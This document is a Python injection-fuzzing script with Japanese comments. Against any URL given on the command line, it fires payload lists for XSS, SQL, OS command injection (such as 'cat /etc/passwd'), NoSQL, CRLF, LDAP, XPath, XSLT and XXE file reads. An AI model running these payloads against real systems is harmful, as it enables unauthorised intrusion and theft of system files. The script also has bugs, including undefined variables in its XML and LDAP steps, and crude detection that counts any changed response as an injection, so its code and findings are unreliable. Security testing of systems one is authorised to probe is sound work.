import requests
import json
import sys
from ldap3 import Server, Connection, ALL
from lxml import etree

# テスト用ペイロードの定義
XSS_PAYLOADS = [
    "<script>alert('XSS');</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "'\"><script>alert('XSS')</script>",
    "<iframe src=javascript:alert('XSS')>",
    "<input type='text' value='XSS' onfocus='alert(\"XSS\")'>"
    ]
SQL_PAYLOADS = [ 
    "'",
    "' OR '1'='1",
    "1' OR '1'='1' --",
    "1' OR '1'='1' /*",
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR '1'='1'--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT username, password FROM users--"
    ]
OS_COMMAND_PAYLOADS = [
    "; ls",
    "&& ls",
    "| ls",
    "; cat /etc/passwd",
    "&& cat /etc/passwd",
    "|| cat /etc/passwd",
    "& whoami",
    "| whoami",
    "& net user"
    ]
NO_SQL_PAYLOADS = [
    '{ "username": { "$ne": "" } }',
    '{ "username": "admin", "password": { "$ne": "" } }',
    '{ "$where": "this.username == \\"admin\\" && this.password != \\"password\\""}',
    '{ "username": { "$gt": "" } }',
    '{ "username": null, "password": { "$ne": null } }'
]
HEADER_PAYLOADS = [
    "test\r\nInjected-Header: injected_value",
    "test\nX-Injected: injected_value",
    "\r\nSet-Cookie: test=1",
    "%0d%0aContent-Length:0%0d%0aInjected-Header: injected_value"
]
JSON_PAYLOADS = [
    '"; "role":"admin',
    '"}, "role":"admin',
    '", "role": "admin}',
    '"<script>alert(1)</script>',
    '"username": "admin", "password": {"$ne": null}',
    '{"username": "admin", "role": {"$gt": "user"}}'
]
CRLF_PAYLOADS = [
    "%0d%0aSet-Cookie: admin=true",
    "%0d%0aContent-Length: 0%0d%0aInjected-Header: test",
    "\r\nLocation: https://malicious.com",
    "\nX-Test: injected_value"
]
LDAP_PAYLOADS = [
    "*)(&(objectClass=*))",
    "*)|(&(objectCategory=person)(objectClass=user))",
    "*)(&(objectCategory=person)(cn=*))",
    "*))(|(objectClass=*))",
    "*)(uid=*))(|(uid=*))"
]
UNICODE_PAYLOADS = [
    "%u0027",
    "%u003Cscript%u003Ealert(1)%u003C/script%u003E",
    "%u003Cimg src=x onerror=alert(1)%u003E",
    "%u003Cbody onload=alert(1)%u003E"
]
XPATH_PAYLOADS = [
    "admin' or '1'='1",
    "' or 1=1 or ''='",
    "' and count(/*)=1 and ''='",
    "' union /user[name/text()='admin']/password/text() and ''='"
]
XSLT_PAYLOADS = [
    '''
    <?xml version="1.0"?>
    <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
      <xsl:template match="/">
        <xsl:value-of select="system-property('os.name')"/>
      </xsl:template>
    </xsl:stylesheet>
    ''',
    '''
    <?xml version="1.0"?>
    <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
      <xsl:template match="/">
        <xsl:value-of select="document('file:///etc/passwd')"/>
      </xsl:template>
    </xsl:stylesheet>
    '''
]
XXE_PAYLOAD = """
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >
]>
<foo>&xxe;</foo>
"""

# ファジング関数 
def fuzz(url, params=None, payloads=None):
    if payloads is None:
        payloads = XSS_PAYLOADS + SQL_PAYLOADS + OS_COMMAND_PAYLOADS

    #比較用のレスポンステキスト
    response = requests.get(url)
    result = response.text

    for payload in payloads:
        test_params = {key: payload for key in (params or {})}
        try:
            response_parttern = requests.get(url, params=test_params)
            
            if response_parttern.status_code != response.status_code or response_parttern.text != result:
                print(f'Found Injection')
                print(f"Tested payload: {payload} | Status: {response_parttern.status_code} ")
            else:
                print(f'Not Found | {payload}')
        except Exception as e:
            print(f"Error with payload {payload}: {e}") 


# NoSQLインジェクション
def test_nosql_injection(url):
    #比較用のレスポンステキスト
    response = requests.get(url)
    result = response.text

    headers = {'Content-Type': 'application/json'}
    for payload in NO_SQL_PAYLOADS:
        try:
            response_parttern = requests.post(url, json=payload, headers=headers)
            
            if response_parttern.status_code != response.status_code or response_parttern.text != result:
                print(f'Found NoSQL Injection')
                print(f"Payload: {payload} | Status: {response_parttern.status_code}")
            else:
                print(f'Not Found | {payload}')
        except Exception as e:
            print(f"Error: {e}")


# CSTIテスト関数
def test_csti(url):
    #比較用のレスポンステキスト
    response = requests.get(url)
    result = response.text
    
    CSTI_PAYLOADS = ["${7*7}"]
    for payload in CSTI_PAYLOADS:
        try:
            response_parttern = requests.get(url, params={"name": payload})
            if response_parttern.status_code != response.status_code or response_parttern.text != result:
                print(f'Found CSTI Injection')
                print(f"Payload: {payload} | Response: {response_parttern.text[:100]}")
            else:
                print(f'Not Found | {payload}')
        except Exception as e:
            print(f"Error: {e}")


# HTTP Header Injecion 
def test_header_injection(url, headers):
    """
    HTTPヘッダーインジェクションのテスト
    """
    #比較用のレスポンステキスト
    response = requests.get(url)
    result = response.text

    for payload in HEADER_PAYLOADS:
        test_headers = {key: payload for key in headers}
        try:
            response_parttern = requests.get(url, headers=test_headers)
            
            if response_parttern.status_code != response.status_code or response_parttern.text != result:
                print(f'Found HTTP Header Injection')
                print(f"Tested with payload: {payload}")
                print(f"Status Code: {response_parttern.status_code}")
                print(f"Response Headers: {response_parttern.headers}")
            else:
                print(f'Not Found | {payload}')
        except Exception as e:
            print(f"Error with payload {payload}: {e}")


# LDAPインジェクション 最初のレスポンス内容の（いろんなインジェクションを比較するため）
def test_ldap_injection(server, base_dn):
    for payload in LDAP_PAYLOADS:
        try:
            conn = Connection(server, user=f"uid={payload},{base_dn}", password="password")
            conn.bind()
            print(f"Payload: {payload} | Bound: {conn.bound}")
            conn.unbind()
        except Exception as e:
            print(f"Error: {e}")



def split_domain(target_url):
    # ドットを基準に分割
    parts = target_url.rsplit('.', 1)  # 右から1回だけ分割

    if len(parts) == 2:
        domain, extension = parts
        return domain, extension
    else:
        return target_url, ""  # 拡張子がない場合

# JSONインジェクション
def test_json_injection(url, base_data):
    """
    JSONインジェクションのテスト
    """
    headers = {
        "Content-Type": "application/json"
    }
    for payload in JSON_PAYLOADS:
        data = base_data.copy()
        data["username"] = payload

        try:
            response = requests.post(url, data=json.dumps(data), headers=headers)
            
            if "admin" in response.text or "alert" in response.text:
                print(f"Potential vulnerability found with payload: {payload}\n")
                print(f"Tested with payload: {payload}")
                print(f"Status Code: {response.status_code}")
                print(f"Response Text: {response.text[:100]}")

            else:
                print(f"Not found | {payload}")
        except Exception as e:
            print(f"Error with payload {payload}: {e}")


#CRLFインジェクション
def test_crlf_injection(url, param):
    """
    CRLFインジェクションのテスト関数
    """
    for payload in CRLF_PAYLOADS:
        params = {param: "apple" + payload}
        response = requests.get(url, params=params)

        

        # レスポンスヘッダーにペイロードが含まれていれば脆弱性が存在する可能性
        if "X-Custom-Header" in response.headers or "Set-Cookie" in response.headers:
            print(f"Potential CRLF Injection with payload: {payload}")
            print(f"Tested payload: {payload}")
            print(f"Status Code: {response.status_code}")
            print(f"Response Headers:\n{response.headers}\n")
        else:
            print(f"Not found {payload}")


#unicodeインジェクション
def test_unicode_injection(url, param):
    for payload in UNICODE_PAYLOADS:
        params = {param: "admin" + payload}
        response = requests.get(url, params=params)
        
        

        if "root:" in response.text:
            print(f"Potential Path Traversal with payload: {payload}")
            print(f"Tested payload: {payload}")
            print(f"Status Code: {response.status_code}")
            print(f"Response:\n{response.text[:100]}\n")
        elif "<script>alert(1)</script>" in response.text:
            print(f"Potential XSS with payload: {payload}")
            print(f"Tested payload: {payload}")
            print(f"Status Code: {response.status_code}")
            print(f"Response:\n{response.text[:100]}\n")
        else:
            print(f"Not Found {payload}")


#xPath and XSTL injection and XXE

#xmlファイルのスクレイピング
def scrape_xml(target_url):
    try:
        if response.headers.get("Content-Type") == "application/xml" or ".xml" in target_url:
            #要素を取得
            xml_content =response.content
            xml_data = etree.fromstring(xml_content)
            return xml_data
        else:
            print("This url do not contain XML file")

    except requests.exceptions.RequestException as req_err:
        print(f"HTTP Request Error: {req_err}")
    except etree.XMLSyntaxError as xml_err:
        print(f"XML Analyze Error: {xml_err}")
    except Exception as e:
        print(f"Unexpected Error: {e}")


#XPathインジェクション検証　　
def test_xpath_injection(xml_data):
    # XMLの読み込み
    xml_root = etree.fromstring(xml_data)

    for payload in XPATH_PAYLOADS:
        # 脆弱なXPathクエリ
        query = f"//user[username='{payload}']/password"

        # XPathクエリを実行
        result = xml_root.xpath(query)

        if result:
            print(f"[+] Injection Success with payload: {payload}")
            for res in result:
                print(f"  - Password: {res.text}")
        else:
            print(f"[-] Failed with payload: {payload}")

#XSLTインジェクション検証
def test_xslt_injection(xml_data):
    """
    XSLT Injectionの検証関数
    """
    for payload in XSLT_PAYLOADS:
        try:
            # XSLTのパース
            xslt_root = etree.XML(payload)
            transform = etree.XSLT(xslt_root)
            
            # XMLをXSLTで変換
            xml_root = etree.XML(xml_data)
            result = transform(xml_root)
            
            print("Payload Executed Successfully!")
            print(result)
        except Exception as e:
            print(f"Failed: {e}")

#XXE 検証
def test_xxe(xml_data):
    """
    XXE脆弱性を検証する関数。

    :param xml_payload: 攻撃を含むXMLデータ
    """
    print("=== Testing XXE Payload ===")
    try:
        # XXE脆弱性があるパーサー
        parser = etree.XMLParser(resolve_entities=True)  # 外部エンティティを解決する設定　取り扱い注意！

        # XMLをパース
        doc = etree.fromstring(xml_data, parser)
        print("[+] XXE Successful! Leaked data:")
        print(etree.tostring(doc, pretty_print=True).decode())
    except Exception as e:
        print(f"[-] Failed to parse: {e}")


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python fuzzing.py <URL>")
        sys.exit(1)

    target_url = sys.argv[1]
    print(f"Target URL: {target_url}")
    
    print("=== XSS SQL OS Injection Test === ")
    
    print("=== Fuzzing ===")
    fuzz(target_url, params={"username": "test", "password":"password", "q": "test"})

    print('=== NoSQL Injection Test') 
    test_nosql_injection(target_url)

    print("=== CSTI Test ===")
    test_csti(target_url)

    print("=== HTTP Header Injection Test")
    headers = {"User-Agent": "test"}  
    test_header_injection(target_url, headers)
    
    print("=== LDAP Injection ===") 
    if "ldap://" in target_url:
        print("contain 'ldap://' ")  
        domain, extension = split_domain(domain_name)
        base_dn = f"dc={domain},dc={extension}"
        test_ldap_injection(target_url, base_dn)
    else:
        print("This url do not contain ldap")
    
    print("=== JSON Injecion Test")
    base_data = {
        "username": "test",
        "role": "user"
    }
    test_json_injection(target_url, base_data)

    print("=== CSLF Injection Test ===")
    test_crlf_injection(target_url, "query")

    print("=== Unicode Injection Test ===")
    test_unicode_injection(target_url, "username") 
    
    print("Scan XML file......")
    xml_data = scrape_xml(target_url)
    print("=== XPath Injection Test ===") 
    test_xpath_injection(xml_data)

    print("===XSLT Injection Test ===") 
    test_xslt_injection(xml_data)

    print("===XXE Test ===") 
    test_xxe(xml_data)